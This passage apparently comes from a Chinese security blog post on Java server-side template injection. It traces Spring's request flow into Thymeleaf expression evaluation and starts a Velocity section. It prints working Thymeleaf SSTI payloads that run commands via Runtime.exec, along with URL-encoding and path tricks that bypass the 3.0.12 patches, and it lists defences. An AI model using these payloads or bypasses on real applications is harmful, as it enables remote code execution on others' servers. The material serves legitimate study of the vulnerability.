+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804865985-cd261a80-40e6-4eb4-885b-4fbfa1e6f103.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804865985-cd261a80-40e6-4eb4-885b-4fbfa1e6f103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在<code>DispatcherServlet#doService</code>下一个断点，因为<code>DispatcherServlet</code>时Spring对前端控制器的默认拦截器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845218639-6408063e-e5fd-4760-bd36-1a4c4471e4fd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845218639-6408063e-e5fd-4760-bd36-1a4c4471e4fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="tIHLE">获取handler</h6>
+
+<p>在<code>doService</code>方法中，前面会赋值一些属性，后面调用了<code>this.doDispath</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845432151-1ca056a4-9503-47fe-a881-66a0d0a831d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845432151-1ca056a4-9503-47fe-a881-66a0d0a831d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>this.doDispath</code>方法，这里的<code>this.getHanlder</code>会寻找我们访问路径所对应的Handler Mappings，再由Hanlder Mapping找到对应的Controller</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845561908-5902f69a-e10a-4075-acb1-af25ad7203f9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845561908-5902f69a-e10a-4075-acb1-af25ad7203f9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>this.getHanlder</code>，在Handler Mappings中存在五个Handler，通过迭代器进行遍历，目的是找到匹配的Handler</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845685605-d37d6ace-042b-4377-b2ea-7ad530d4ae46.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845685605-d37d6ace-042b-4377-b2ea-7ad530d4ae46.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">再次跟进<code>getHanlder</code>，然后层层跟入<code>getHandlerInternal</code>方法以及父类的<code>getHandlerInternal</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846004777-29eba5de-dc91-4e19-b034-a3ffe225b31c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846004777-29eba5de-dc91-4e19-b034-a3ffe225b31c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>进入<code>lookupHandlerMethod</code>，首先根据传入的<code>lookupPath</code>进行匹配对应的路径，如果无法通过URI直接匹配，则对所有注册的RequestMapping进行匹配</p>
+<p>无法通过URI匹配的情况主要有三种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// ①在RequestMapping中定义的是PathVariable，如/user/detail/&#123;id&#125;； </span><br><span class="line">// ②在RequestMapping中定义了问号表达式，如/user/?etail； </span><br><span class="line">// ③在RequestMapping中定义了*或**匹配，如/user/detail/** // No choice but to go through all mappings...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846671736-f74e8fec-eec9-4d00-84c3-87e316c1dead.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846671736-f74e8fec-eec9-4d00-84c3-87e316c1dead.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="sj79C">获取Controller</h6>
+
+<p>获取到匹配结果后，new了一个comparator，然后对匹配的结果进行排序，来获取相似度最高的（<code>get(0)</code>），如果存在两个匹配结果重合度一致时，就会抛出异常</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846919416-87960c0b-730f-46ef-a643-6a9a6d2219fc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846919416-87960c0b-730f-46ef-a643-6a9a6d2219fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>这里可以看到，匹配到的时<code>GET /path</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847186339-5214d36a-b9b5-4d9c-aaf0-ba065e484733.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847186339-5214d36a-b9b5-4d9c-aaf0-ba065e484733.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>回到<code>DispatherServlet</code>中，向下跟，跟进<code>getHandlerAdpter</code>方法中，这个方法的目的是找到目标处理器的适配器</p>
+<p>通过迭代器遍历<code>handlerAdapters</code>，判断该<code>adapter</code>是否支持该<code>handler</code>，如果支持则返回该<code>adapter</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847304592-f2ce25bd-5b17-4d58-8a41-23c947b3ced9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847304592-f2ce25bd-5b17-4d58-8a41-23c947b3ced9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847325623-12e7f47e-1c1f-4f67-b3c9-2e523d93c9ff.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847325623-12e7f47e-1c1f-4f67-b3c9-2e523d93c9ff.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="J44FC">获取ModelAndView</h6>
+
+<p>再次回到<code>DispatherServlet</code>，调用了<code>ha.handle</code>，实现执行Controller中（Handler）的方法，并返回ModelAndView试图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847678246-070bd8bf-684c-42ef-93ed-8a3ca61668fa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847678246-070bd8bf-684c-42ef-93ed-8a3ca61668fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>handle</code>方法，继续跟进<code>this.handleInternal</code>，跟进至<code>this.invokeHandlerMethod</code>方法，就到了真正的业务方法</p>
+<p>这里的<code>handlerMethod</code>其实就是<code>ThymeleafController#path(String)</code>，通过调用<code>this.createInvocableHandlerMethod</code>，将<code>handlerMethod</code>包装成一个<code>ServletInvocableHandlerMethod</code>类，让其具有invoke的执行能力</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847849760-e14df5b1-824f-43fa-ab52-3cb511078fb9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847849760-e14df5b1-824f-43fa-ab52-3cb511078fb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>后续会给<code>invocableMethod</code>的各大属性赋值，赋值后new了一个<code>ModelAndViewContainer对象</code>，后面的所有值都会保存到这一个对象中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753848038826-51991693-9f0e-48ab-935b-424b73f07d7e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753848038826-51991693-9f0e-48ab-935b-424b73f07d7e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续往下走，调用了<code>invocableMethod.invokeAndHandle</code>，这个方法的作用是获取<code>returnValueHandlers</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851008470-5e8cbda9-c178-4456-8bb0-73f92ada2818.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851008470-5e8cbda9-c178-4456-8bb0-73f92ada2818.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>进入<code>this.invokeForRequest</code>首先获取参数，然后调用<code>this.doInvoke</code>，层层跟进<code>invoke</code>，最后调用<code>invokeImpl</code>，根据参数的个数来invoke调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851029265-41491ef4-d7a9-4fce-a228-5ca3b49f4c31.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851029265-41491ef4-d7a9-4fce-a228-5ca3b49f4c31.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851075784-57052191-bc15-4682-b3af-c1d73b9e00e3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851075784-57052191-bc15-4682-b3af-c1d73b9e00e3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851178401-599f5383-933e-45ca-9bea-131239b5490c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851178401-599f5383-933e-45ca-9bea-131239b5490c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>这样就走到了我们的<code>HelloController</code>处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851220323-4499af3f-1570-4f97-a3b3-111c263d073d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851220323-4499af3f-1570-4f97-a3b3-111c263d073d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>return返回后，回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>，后面调用<code>this.getModelAndView</code>获取ModelAndView对象</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851421084-ead792cb-925c-4a45-b223-ae621f1c0486.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851421084-ead792cb-925c-4a45-b223-ae621f1c0486.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="BHTP0">ViewResolver与渲染</h6>
+
+<p>获取到ModelAndView后，应该就要进行模板的渲染操作了，回到<code>DispatcherServlet#doDispatch</code></p>
+<p>下面调用<code>mappedHandler.applyPostHandle</code>，该方法会遍历Interceptor，调用其<code>postHandler</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851547510-7cce7304-4285-485a-aabd-a42949601b18.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851547510-7cce7304-4285-485a-aabd-a42949601b18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851607808-0b6d7197-f0db-4fb9-9a60-347db2a78bf1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851607808-0b6d7197-f0db-4fb9-9a60-347db2a78bf1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>遍历结束后，会调用<code>this.processDispatchResult</code>方法，在这里对Dispath的结果进行加工处理，在判断完<code>ModelAndView</code>不为空后，就会调用<code>this.render</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851811085-117eee2a-e9ac-4eb3-b8d0-ce2cfe1566db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851811085-117eee2a-e9ac-4eb3-b8d0-ce2cfe1566db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>this.reader</code>方法，前面会进行一些国际化的判断，获取viewName，这里的viewName就是我们Controller中return的东西，如果我们的模板是<code>FreeMarker</code>，那么view就是<code>FreeMarkerView</code>，如果是<code>Thymeleaf</code>，那么view就是<code>ThymeleafView</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851953888-28cee596-d9c5-41ad-920a-f98363b20ad4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851953888-28cee596-d9c5-41ad-920a-f98363b20ad4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续跟进<code>view.render</code>中，也就是<code>ThymeleafView.render</code>方法，继续跟进<code>this.renderFragment</code>。在第一个标记部分，会判断我们的<code>viewTemplateName</code>中是有存在<code>::</code>，如果不存在则不做解析处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852208089-f3446729-3f8a-4ffe-9026-eb7097c836a6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852208089-f3446729-3f8a-4ffe-9026-eb7097c836a6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续向下跟进<code>parser.parseExpression</code>处，这里就对我们输入的字符串进行了处理（传入的字符串会进行拼接<code>~&#123;......&#125;</code>，也就是传入片段表达式中），再<code>standardExpressionPreprocessor.preprocess</code></p>
+<p>首先判断input中是否存在<code>_</code>字符，没有则不做解析，接着调用<code>matcher</code>进行匹配<code>__</code>，并提取<code>__</code>中间的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852500348-de2abdf7-a2ec-4619-80a2-3d50654df9fb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852500348-de2abdf7-a2ec-4619-80a2-3d50654df9fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">继续向下走，就到了<code>expression.execute</code>方法处，这里解析并执行我们的SPEL表达式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852750354-39cfd7e6-8e28-4183-846c-2f61e4b8eecb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852750354-39cfd7e6-8e28-4183-846c-2f61e4b8eecb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="UvesV">Thymeleaf SSTI Bypass</h4>
+<h5 id="XAj9D">传参检测与绕过</h5>
+
+<p>我们正常攻击时，使用的Poc是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<p>在Thymeleaf 3.0.12中，对这个漏洞做了修复</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852871326-fafac758-807d-43f0-8dfc-b258fc100ed6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852871326-fafac758-807d-43f0-8dfc-b258fc100ed6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在调用表达式时，会经过以下函数的判断</p>
+<p>倒序检测是否包含<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">wen</font>、在<code>(</code>的左右是否包含<code>T</code>字符，如果包含的话，那么就认为找到了一个实例化的对象，返回true，从而阻止该表达式的执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsSpELInstantiationOrStatic</span><span class="params">(<span class="keyword">final</span> String expression)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">explen</span> <span class="operator">=</span> expression.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> explen;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ni</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// index for computing position in the NEW_ARRAY</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">si</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">while</span> (n-- != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        c = expression.charAt(n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ni &lt; NEW_LEN</span><br><span class="line">            &amp;&amp; c == NEW_ARRAY[ni]</span><br><span class="line">            &amp;&amp; (ni &gt; <span class="number">0</span> || ((n + <span class="number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="number">1</span>))))) &#123;</span><br><span class="line">            ni++;</span><br><span class="line">            <span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we found an object instantiation</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n += ni;</span><br><span class="line">            ni = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">                <span class="comment">// This has to be restarted too</span></span><br><span class="line">                si = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ni = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">            si = n;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span></span><br><span class="line">                   &amp;&amp; ((n - <span class="number">1</span> &gt;= <span class="number">0</span>) &amp;&amp; (expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">                   &amp;&amp; ((n - <span class="number">1</span> == <span class="number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            si = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果要绕过这个函数的话，就需要满足：</p>
+<ol>
+<li>表达式中不能包含new关键字</li>
+<li>在<code>(</code>左边的字符不是<code>T</code></li>
+</ol>
+<p>那么可以通过在<code>T</code>和<code>(</code>中间添加一个字符，来绕过检测，但是不能使原有的表达式出现问题，可以利用的包括<code>%20</code>，<code>%0a</code>，<code>%09</code>，<code>%0d</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;T%<span class="number">20</span>(%0ajava.lang.Runtime%09).%0dgetRuntime%0a(%09)%<span class="number">0d</span>.%00exec(<span class="string">&#x27;calc&#x27;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<h5 id="mfCEA">url中的ThymeleafSSTI</h5>
+根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;  </span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);  </span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样在3.0.12版本也被修复了，官方说明如下</p>
+<blockquote>
+<p>如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为片段表达式执行</p>
+</blockquote>
+<p>意思是：如果视图的名字和path一致的话，那么就会经过<code>SpringRequestUtils.java</code>中<code>checkViewNameNotInRequest</code>方法的检测</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753854314865-d845faae-4073-4475-b3b7-5c93c3131cae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753854314865-d845faae-4073-4475-b3b7-5c93c3131cae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>想要绕过的话，我们可以想办法让 视图的名字和path 不一致，就可以绕过检测</p>
+<p>这里直接将两个Poc拿出来，不进行分析了：</p>
+<h6 id="Bgk9I">Poc1</h6>
+
+<p>在home的后面加上一个<code>;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home;/__$&#123;t(java.lang.runtime).getruntime().exec(<span class="string">&quot;open-acalculator&quot;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<h6 id="ugyPD">Poc2</h6>
+
+<p>添加一个<code>/</code>字符</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home<span class="comment">//__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="vOrLm">ThymeleafSSTI无回显</h4>
+
+<p>出现的场景为在片段选择器<code>templatename::selector</code>下。fragment中payload前有<code>::</code>，所以payload在selector位置会抛出异常，虽然无法回显成功，但是命令依旧可以执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@GetMapping(&quot;/fragment&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">fragment</span><span class="params">(<span class="meta">@RequestParam</span> String section)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome :: &quot;</span> + section; <span class="comment">//fragment is tainted  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="qtB3K">Thymeleaf中SSTI的防御</h4>
+
+<p>防御方法如下：</p>
+<ul>
+<li>配置<code>@ResponseBody</code>或<code>@RestController</code>，配置以上注解后就不会进行View解析而是直接返回</li>
+<li>在方法参数中加上<code>HttpServletResponse</code>参数，spring会认为以及处理了response响应而不再进行试图解析</li>
+<li>在返回值前面加上<code>redirect:</code>，交给<code>RedirectView</code>处理</li>
+</ul>
+<h3 id="g0UuM">Velocity</h3>
+
+<p>Velocity 是一个基于 Java 的模板引擎。它允许任何人使用简单但功能强大的模板语言来引用 Java 代码中 定义的对象。</p>
+<h4 id="H5gZl">Velocity基础</h4>
+<h5 id="ULBSL">Velocity语法基础</h5>
+
+<ul>
+<li><code>#</code>关键字：Velocity关键字都是用<code>#</code>开头的，如<code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code>等</li>
+<li><code>$</code>变量：在Velocity中，变量都是以<code>$</code>开头的，如<code>$name</code>、<code>$msg</code>等</li>
+<li><code>set</code>指令：<code>#set</code>指令用于设置引用的值，一个值可以被赋给一个变量引用或属性引用，如<code>#set&#123; $name = &quot;sean&quot; &#125;</code>、<code>#set&#123; $person.name = $username &#125;</code></li>
+<li>方法：方法在Java中被定义，由<code>$</code>、标识符、方法体组成，如<code>$customer.getAddress()</code>、<code>$page.setTitle( &quot;My home&quot; )</code></li>
+</ul>
+<h4 id="VEHxw">Velocity SSTI</h4>
+<h5 id="Djxun">环境搭建</h5>
+
+<p>创建一个SpringBoot项目，选择导入SpringWeb依赖</p>
+<p>然后向项目中导入<code>Velocity</code>依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Velocity模板中，有两种触发方式，这里我们创建两个Controller</p>
+<h6 id="wBNzX"><font style="color:rgb(51,51,51);">evaluate触发</font></h6>
+evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的渲染，evaluate方法的基本语法如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">evaluate</span><span class="params">(Writer writer, Context context, String logTag, String instring)</span></span><br><span class="line"><span class="comment">//writer：输出结果的写入器，用于将生成的结果写入指定位置</span></span><br><span class="line"><span class="comment">//context：上下文数据，用于替换模板中的占位符数据</span></span><br><span class="line"><span class="comment">//logTag：日志标签，用于在日志中区分不同的evaluate调用</span></span><br><span class="line"><span class="comment">//instring：待处理的Velocity模板字符串</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞Demo如下，获取用户输入，并放入VelocityContext中进行渲染，如果没有接收的是恶意payload，就会造成任意代码执行。</p>
